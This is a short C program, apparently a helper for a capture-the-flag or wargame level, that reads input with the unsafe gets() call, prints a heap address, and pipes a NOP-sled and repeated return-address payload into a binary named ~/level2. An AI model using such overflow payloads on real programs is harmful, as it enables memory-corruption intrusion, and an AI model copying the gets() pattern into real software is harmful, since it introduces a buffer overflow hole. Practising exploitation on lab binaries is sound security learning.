#include <string.h>
#include <stdio.h>
int main()
{
char hello[50] = {0};

gets(hello);
char *x = strndup(hello, 50);
printf("%p\n", x);
system("python -c \"print(b'\x90'*108 + b'\x08\xb0\x04\x80' * 4)\" | ~/level2");
//system("./a");
return 0;
}
